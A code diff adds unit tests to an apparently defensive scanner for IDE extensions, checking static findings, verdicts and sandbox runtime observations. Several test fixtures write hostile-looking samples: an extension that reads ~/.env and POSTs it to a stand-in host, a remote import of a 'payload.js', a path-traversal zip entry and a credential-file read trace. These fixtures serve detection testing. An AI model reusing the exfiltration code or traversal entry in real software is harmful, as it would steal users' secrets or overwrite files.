@@ -15,20 +15,62 @@ from ide_scanner.cli import _run_benchmark
 from ide_scanner.posture import scan_posture, summarize_posture
 from ide_scanner.registry import _marketplace_metadata_findings, _repository_metadata_findings
 from ide_scanner.report_bundle import build_report_bundle, iter_report_events, write_report_bundle
-from ide_scanner.sandbox_runner import run_sandbox
+from ide_scanner.sandbox_runner import _observations_from_trace, _prepare_target, run_sandbox
 from ide_scanner.models import Finding
 from ide_scanner.scanner import (
     _classify_findings,
+    _build_report,
+    _add_ast_findings,
+    _find_sensitive_api_text,
     _is_generated_code_blob,
+    _local_error_extension,
     _marketplace_error_extension,
     _score_details,
     _semgrep_scope_exclusion,
+    _sandbox_observation_finding,
     scan_extension,
     scan_targets,
 )
 
 
 class ScannerTests(unittest.TestCase):
+    def test_ast_dynamic_call_targets_are_aggregated_per_file(self) -> None:
+        findings: list[Finding] = []
+        with patch(
+            "ide_scanner.scanner.analyze_js_source_status",
+            return_value=(
+                [
+                    {"rule": "ast-dynamic-call-target", "line": 10, "detail": "first"},
+                    {"rule": "ast-dynamic-call-target", "line": 20, "detail": "second"},
+                ],
+                "ok",
+            ),
+        ):
+            status = _add_ast_findings("example.ext", "1.0.0", "dist/main.js", "x", findings)
+        self.assertEqual(status, "ok")
+        self.assertEqual(len(findings), 1)
+        self.assertEqual(findings[0].rule_id, "ast-dynamic-call-target")
+        self.assertEqual(findings[0].evidence["count"], 2)
+        self.assertIn("2 computed call target(s)", findings[0].evidence_summary)
+
+    def test_incomplete_artifact_is_not_counted_as_clean(self) -> None:
+        extension = _local_error_extension(Path("/tmp/timed-out-extension"), "vscode", "worker timeout")
+        report = _build_report(
+            [extension],
+            {"enabled": False, "mode": "disabled", "findings": [], "errors": []},
+            include_posture=False,
+        )
+        self.assertEqual(report["summary"]["by_verdict"], {})
+        self.assertEqual(report["summary"]["by_analysis_status"], {"failed": 1})
+        self.assertIn("0 clean, 1 incomplete", report["human_summary"][0])
+
+    def test_parallel_local_scan_preserves_serial_results(self) -> None:
+        serial = scan_targets(include_fixtures=True, include_posture=False, jobs=1)
+        parallel = scan_targets(include_fixtures=True, include_posture=False, jobs=2)
+        serial_rows = [(item["extension_id"], item["decision"], item["risk_score"]) for item in serial["extensions"]]
+        parallel_rows = [(item["extension_id"], item["decision"], item["risk_score"]) for item in parallel["extensions"]]
+        self.assertEqual(parallel_rows, serial_rows)
+
     def test_range_derived_advisory_is_context_until_version_is_resolved(self) -> None:
         finding = Finding(
             finding_id="range-advisory",
@@ -159,7 +201,7 @@ class ScannerTests(unittest.TestCase):
         self.assertEqual(by_id["unknown.dropper"]["verdict"], "suspicious")
         self.assertEqual(by_id["example.mutable-dependency"]["verdict"], "clean")
         self.assertEqual(by_id["example.mutable-dependency"]["severity"], "LOW")
-        self.assertEqual(by_id["example.native-artifact"]["verdict"], "review")
+        self.assertEqual(by_id["example.native-artifact"]["verdict"], "clean")
 
         suspicious = by_id["unknown.shadow-helper"]
         self.assertEqual(suspicious["verdict"], "suspicious")
@@ -616,6 +658,8 @@ class ScannerTests(unittest.TestCase):
         self.assertEqual(by_id["knownbad.feed-hit"]["expected_verdict"], "malicious")
         self.assertEqual(by_id["knownbad.feed-hit"]["actual_verdict"], "malicious")
         self.assertEqual(result["false_negative"], 0)
+        self.assertTrue(result["rule_observations"])
+        self.assertEqual(result["rule_observations"][0]["rule_id"], "repo-url-missing")
 
     def test_discovery_finds_vsix_files(self) -> None:
         with TemporaryDirectory() as tmp:
@@ -1088,6 +1132,12 @@ class ScannerTests(unittest.TestCase):
         self.assertEqual(scanned["verdict"], "suspicious")
         self.assertEqual(scanned["malware_authority"], "non_authoritative")
         self.assertIn("observed-secret-exfil", {finding["rule_id"] for finding in scanned["findings"]})
+        self.assertEqual(report["privacy_mode"], "local-metadata-static-features-plus-controlled-runtime")
+        self.assertEqual(report["intelligence"]["dynamic_sandbox"]["status"], "imported")
+        self.assertEqual(
+            scanned["analysis_coverage"]["providers"]["dynamic_sandbox"]["status"],
+            "imported",
+        )
 
     def test_artifact_inventory_flags_native_and_packed_artifacts(self) -> None:
         with TemporaryDirectory() as tmp:
@@ -1101,7 +1151,7 @@ class ScannerTests(unittest.TestCase):
 
             report = scan_extension(root)
 
-        self.assertEqual(report.verdict, "review")
+        self.assertEqual(report.verdict, "clean")
         self.assertEqual(report.malware_score, 0)
         self.assertGreater(report.risk_score, 0)
         self.assertEqual(report.artifact_inventory["files_hashed"], 3)
@@ -1279,6 +1329,39 @@ class ScannerTests(unittest.TestCase):
         self.assertEqual(report.malware_authority, "none")
         self.assertTrue(all(finding.evidence["evidence_class"] == "reputation" for finding in report.findings))
 
+    def test_local_dynamic_import_is_not_mislabeled_as_code_evaluation(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"dynamic-import","version":"1.0.0","main":"extension.js"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                'async function load() { return import("./feature.js"); }',
+                encoding="utf-8",
+            )
+            (root / "feature.js").write_text("module.exports = {};", encoding="utf-8")
+
+            report = scan_extension(root)
+
+        self.assertNotIn("dynamic-code-loading", {finding.rule_id for finding in report.findings})
+
+    def test_remote_dynamic_import_remains_visible(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"remote-import","version":"1.0.0","main":"extension.js"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                'async function load() { return import("https://example.invalid/payload.js"); }',
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        self.assertIn("dynamic-code-loading", {finding.rule_id for finding in report.findings})
+
     def test_large_generated_bundle_does_not_create_correlated_chain(self) -> None:
         with TemporaryDirectory() as tmp:
             root = Path(tmp)
@@ -1391,6 +1474,16 @@ class ScannerTests(unittest.TestCase):
             report = scan_extension(root)
 
         self.assertNotIn("credential-config-update", {finding.rule_id for finding in report.findings})
+
+    def test_unterminated_generated_configuration_call_is_bounded(self) -> None:
+        text = "".join("getConfiguration(" + ("x" * 1000) for _ in range(200))
+        matches = _find_sensitive_api_text(
+            text,
+            r"(?:getConfiguration\s*\([^)]{0,500}\)\s*\.\s*get|config\s*\.\s*get)\s*\((?P<args>[^;\n]{0,500})",
+            "WorkspaceConfiguration",
+        )
+
+        self.assertEqual(matches, [])
 
     def test_declared_dist_entrypoint_is_never_silently_skipped(self) -> None:
         with TemporaryDirectory() as tmp:
@@ -1679,6 +1772,108 @@ class ScannerTests(unittest.TestCase):
         self.assertEqual(len(observations["plan"]["commands"]), 1)
         self.assertEqual(observations["extensions"]["example.sandboxed"], [])
 
+    def test_sandbox_runtime_exfil_requires_canary_in_network_body(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            canary_file = root / "home" / ".aws" / "credentials"
+            trace = root / "trace.jsonl"
+            events = [
+                {"kind": "fs_read", "path": str(canary_file), "api": "readFileSync"},
+                {"kind": "network", "target": "https://example.invalid"},
+                {"kind": "network_write", "contains_canary": False, "bytes": 4},
+            ]
+            trace.write_text("\n".join(json.dumps(item) for item in events) + "\n", encoding="utf-8")
+            observations = _observations_from_trace(trace, [str(canary_file)])
+
+        kinds = {item["kind"] for item in observations}
+        self.assertIn("secret_read", kinds)
+        self.assertIn("network_attempt", kinds)
+        self.assertNotIn("secret_exfil", kinds)
+
+    def test_sandbox_timeout_is_visible_but_not_decision_relevant(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"timeout","version":"1.0.0"}',
+                encoding="utf-8",
+            )
+            extension = scan_extension(root)
+            finding = _sandbox_observation_finding(
+                extension,
+                {"kind": "runtime_timeout", "phase": "activation", "evidence": "timed out"},
+            )
+
+        self.assertIsNotNone(finding)
+        assert finding is not None
+        self.assertEqual(finding.rule_id, "sandbox-runtime-timeout")
+        self.assertEqual(finding.evidence["evidence_class"], "weak")
+        self.assertEqual(finding.to_dict()["actionability"], "contextual")
+        self.assertEqual(finding.to_dict()["effective_severity"], "INFO")
+
+    def test_sandbox_capability_observations_are_contextual_without_canary_abuse(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"capabilities","version":"1.0.0"}',
+                encoding="utf-8",
+            )
+            extension = scan_extension(root)
+            observations = [
+                {"kind": "network_attempt", "destination": "https://example.invalid"},
+                {"kind": "process_exec", "command": "language-server --stdio"},
+                {"kind": "filesystem_write", "path": "/tmp/cache"},
+            ]
+            findings = [_sandbox_observation_finding(extension, item) for item in observations]
+
+        self.assertEqual(
+            {finding.rule_id for finding in findings if finding is not None},
+            {"runtime-network-attempt", "runtime-process-execution", "runtime-filesystem-write"},
+        )
+        self.assertTrue(all(finding is not None and finding.to_dict()["actionability"] == "contextual" for finding in findings))
+
+    def test_sandbox_capability_only_observations_do_not_route_review(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"capability-only","version":"1.0.0"}',
+                encoding="utf-8",
+            )
+            observations = root / "observations.json"
+            observations.write_text(json.dumps({
+                "extensions": {
+                    "example.capability-only": [
+                        {"kind": "network_attempt", "destination": "https://example.invalid"},
+                        {"kind": "process_exec", "command": "language-server --stdio"},
+                        {"kind": "filesystem_write", "path": "/tmp/cache"},
+                    ],
+                },
+            }), encoding="utf-8")
+            report = scan_targets(
+                paths=[root],
+                sandbox_observations_file=observations,
+                include_posture=False,
+            )
+
+        extension = report["extensions"][0]
+        self.assertEqual(extension["decision"], "allow")
+        self.assertEqual(extension["public_outcome"], "clear")
+        self.assertEqual(extension["analysis_status"], "complete")
+
+    def test_sandbox_rejects_unsafe_runtime_inputs(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            extension = root / "extension"
+            extension.mkdir()
+            (extension / "package.json").write_text("{}", encoding="utf-8")
+            with self.assertRaises(ValueError):
+                run_sandbox(extension, timeout_seconds=0)
+
+            archive = root / "unsafe.vsix"
+            with zipfile.ZipFile(archive, "w") as handle:
+                handle.writestr("../escape.txt", "unsafe")
+            with self.assertRaises(ValueError):
+                _prepare_target(archive, root / "extracted")
+
     def test_sandbox_runner_runtime_instrumentation_observes_secret_exfil(self) -> None:
         with TemporaryDirectory() as tmp:
             root = Path(tmp)
@@ -1697,8 +1892,50 @@ class ScannerTests(unittest.TestCase):
                 encoding="utf-8",
             )
 
-            with self.assertRaisesRegex(ValueError, "OS-level"):
-                run_sandbox(root, allow_execute=True, timeout_seconds=5)
+            observations = run_sandbox(root, allow_execute=True, timeout_seconds=5)
+
+        self.assertEqual(observations["mode"], "executed")
+        self.assertEqual(observations["plan"]["backend"], "bubblewrap")
+        runtime_observations = observations["extensions"]["example.runtime"]
+        kinds = {item["kind"] for item in runtime_observations}
+        self.assertIn("secret_read", kinds)
+        self.assertIn("network_attempt", kinds)
+        self.assertIn("secret_exfil", kinds)
+
+    def test_sandbox_runner_probes_registered_commands_and_webview_messages(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"agentic-runtime","version":"1.0.0","main":"extension.js"}',
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "const fs=require('fs'); const https=require('https'); const vscode=require('vscode');"
+                "function collect(){"
+                "const data=fs.readFileSync(process.env.HOME+'/.env','utf8');"
+                "fs.writeFileSync(process.env.HOME+'/.probe',data);"
+                "const req=https.request('https://example.invalid/collect',{method:'POST'});"
+                "req.write(data); req.end();"
+                "}"
+                "function activate(){"
+                "vscode.commands.registerCommand('example.collect',collect);"
+                "const panel=vscode.window.createWebviewPanel('example','Example',1,{});"
+                "panel.webview.onDidReceiveMessage(()=>undefined);"
+                "}"
+                "module.exports={activate};",
+                encoding="utf-8",
+            )
+
+            observations = run_sandbox(root, allow_execute=True, timeout_seconds=5)
+
+        runtime_observations = observations["extensions"]["example.agentic-runtime"]
+        kinds = {item["kind"] for item in runtime_observations}
+        self.assertIn("runtime_command_registered", kinds)
+        self.assertIn("runtime_command_probe", kinds)
+        self.assertIn("runtime_webview_created", kinds)
+        self.assertIn("runtime_webview_message_probe", kinds)
+        self.assertIn("filesystem_write", kinds)
+        self.assertIn("secret_exfil", kinds)
 
     def test_repo_binary_artifacts_metric_fires_for_committed_native_binary(self) -> None:
         with TemporaryDirectory() as tmp:
@@ -1715,7 +1952,24 @@ class ScannerTests(unittest.TestCase):
         self.assertIn("repo-binary-artifacts", rule_ids)
         self.assertIn("binary-without-origin", rule_ids)
         self.assertEqual(report.malware_score, 0)
-        self.assertEqual(report.verdict, "review")
+        self.assertEqual(report.verdict, "clean")
+
+    def test_native_origin_gap_is_aggregated_into_one_hardening_note(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                '{"publisher":"example","name":"native-many","version":"1.0.0"}',
+                encoding="utf-8",
+            )
+            for name in ("server.node", "helper.node"):
+                (root / name).write_bytes(b"native-binary-payload")
+
+            report = scan_extension(root)
+
+        binary_findings = [finding for finding in report.findings if finding.rule_id == "binary-without-origin"]
+        self.assertEqual(len(binary_findings), 1)
+        self.assertEqual(binary_findings[0].evidence.get("unverified_count"), 2)
+        self.assertEqual(report.verdict, "clean")
 
     def test_artifact_controlled_checksum_does_not_prove_binary_origin(self) -> None:
         with TemporaryDirectory() as tmp:
